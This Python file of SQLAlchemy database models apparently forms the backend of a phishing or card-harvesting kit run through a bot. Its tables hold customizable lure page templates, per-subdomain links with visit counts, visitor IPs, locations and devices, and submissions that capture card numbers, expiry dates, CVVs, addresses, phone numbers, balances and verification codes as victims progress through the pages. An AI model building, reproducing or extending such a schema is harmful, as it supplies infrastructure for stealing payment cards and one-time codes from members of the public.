import uuid
from datetime import datetime

from sqlalchemy import BigInteger, Boolean, ForeignKey, Integer, Text, String, UniqueConstraint
from sqlalchemy.dialects.postgresql import UUID
from sqlalchemy.orm import DeclarativeBase, Mapped, mapped_column, relationship


class Base(DeclarativeBase):
    pass


class User(Base):
    __tablename__ = "users"

    id: Mapped[int] = mapped_column(BigInteger, primary_key=True)
    username: Mapped[str | None] = mapped_column(String(64))
    created_at: Mapped[datetime] = mapped_column(default=datetime.utcnow)


class Domain(Base):
    __tablename__ = "domains"
    __table_args__ = (UniqueConstraint("user_id", name="uq_domains_user_id"),)

    id: Mapped[uuid.UUID] = mapped_column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
    domain: Mapped[str] = mapped_column(String(255), unique=True, nullable=False)
    is_active: Mapped[bool] = mapped_column(Boolean, default=True)
    subdomain_count: Mapped[int] = mapped_column(Integer, default=0)
    user_id: Mapped[int | None] = mapped_column(
        BigInteger,
        ForeignKey("users.id", ondelete="SET NULL"),
        nullable=True,
        index=True,
    )
    created_at: Mapped[datetime] = mapped_column(default=datetime.utcnow)


class Template(Base):
    __tablename__ = "templates"

    id: Mapped[uuid.UUID] = mapped_column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
    user_id: Mapped[int] = mapped_column(BigInteger, ForeignKey("users.id", ondelete="CASCADE"))
    name: Mapped[str | None] = mapped_column(String(100))

    bg_color: Mapped[str] = mapped_column(String(7), default="#ffffff")
    text_color: Mapped[str] = mapped_column(String(7), default="#000000")
    font_family: Mapped[str] = mapped_column(String(100), default="Inter, sans-serif")
    title: Mapped[str] = mapped_column(String(200), default="")
    description: Mapped[str] = mapped_column(Text, default="")
    button_text: Mapped[str] = mapped_column(String(100), default="")
    button_url: Mapped[str] = mapped_column(Text, default="")
    accent_color: Mapped[str] = mapped_column(String(7), default="#29abe2")
    favicon_url: Mapped[str] = mapped_column(Text, default="")
    custom_css: Mapped[str] = mapped_column(Text, default="")

    created_at: Mapped[datetime] = mapped_column(default=datetime.utcnow)
    updated_at: Mapped[datetime] = mapped_column(default=datetime.utcnow, onupdate=datetime.utcnow)


class Link(Base):
    __tablename__ = "links"

    id: Mapped[uuid.UUID] = mapped_column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
    user_id: Mapped[int] = mapped_column(BigInteger, ForeignKey("users.id", ondelete="CASCADE"))
    template_id: Mapped[uuid.UUID] = mapped_column(UUID(as_uuid=True), ForeignKey("templates.id", ondelete="CASCADE"))
    domain_id: Mapped[uuid.UUID] = mapped_column(UUID(as_uuid=True), ForeignKey("domains.id"))

    subdomain: Mapped[str] = mapped_column(String(60), nullable=False)
    link_id: Mapped[str] = mapped_column(String(20), nullable=False)
    full_url: Mapped[str] = mapped_column(Text, nullable=False)

    is_active: Mapped[bool] = mapped_column(Boolean, default=True)
    visits: Mapped[int] = mapped_column(Integer, default=0)

    created_at: Mapped[datetime] = mapped_column(default=datetime.utcnow)

    template: Mapped[Template] = relationship("Template", lazy="joined")
    domain: Mapped[Domain] = relationship("Domain", lazy="joined")


class Visitor(Base):
    __tablename__ = "visitors"

    id: Mapped[int] = mapped_column(Integer, primary_key=True, autoincrement=True)
    ip: Mapped[str] = mapped_column(String(45), nullable=False)
    city: Mapped[str | None] = mapped_column(String(100))
    country: Mapped[str | None] = mapped_column(String(100))
    device: Mapped[str | None] = mapped_column(String(200))
    sys_lang: Mapped[str | None] = mapped_column(String(20))
    first_seen: Mapped[datetime] = mapped_column(default=datetime.utcnow)


class Submission(Base):
    """Card/address payload from a visitor session — updated as they progress."""
    __tablename__ = "submissions"

    id: Mapped[uuid.UUID] = mapped_column(UUID(as_uuid=True), primary_key=True, default=uuid.uuid4)
    session_id: Mapped[str] = mapped_column(String(64), unique=True, nullable=False, index=True)
    visitor_id: Mapped[int | None] = mapped_column(Integer, nullable=True)
    subdomain: Mapped[str] = mapped_column(String(60), default="")
    link_id: Mapped[str] = mapped_column(String(20), default="")

    card_number: Mapped[str] = mapped_column(String(32), default="")
    card_exp: Mapped[str] = mapped_column(String(10), default="")
    card_cvv: Mapped[str] = mapped_column(String(8), default="")
    card_name: Mapped[str] = mapped_column(String(200), default="")

    country: Mapped[str] = mapped_column(String(8), default="")
    address1: Mapped[str] = mapped_column(Text, default="")
    address2: Mapped[str] = mapped_column(Text, default="")
    zip_code: Mapped[str] = mapped_column(String(32), default="")
    city: Mapped[str] = mapped_column(String(100), default="")
    phone_dial: Mapped[str] = mapped_column(String(16), default="")
    phone: Mapped[str] = mapped_column(String(40), default="")

    balance_amount: Mapped[str] = mapped_column(String(40), default="")
    balance_currency: Mapped[str] = mapped_column(String(8), default="")
    verification_code: Mapped[str] = mapped_column(String(16), default="")

    created_at: Mapped[datetime] = mapped_column(default=datetime.utcnow)
    updated_at: Mapped[datetime] = mapped_column(default=datetime.utcnow, onupdate=datetime.utcnow)


class AllowedUser(Base):
    """Users that have been granted access to the bot by a super-admin."""
    __tablename__ = "allowed_users"

    user_id: Mapped[int] = mapped_column(BigInteger, primary_key=True)
    # optional display label set by the admin when granting access
    note: Mapped[str | None] = mapped_column(String(200))
    granted_by: Mapped[int] = mapped_column(BigInteger, nullable=False)
    granted_at: Mapped[datetime] = mapped_column(default=datetime.utcnow)
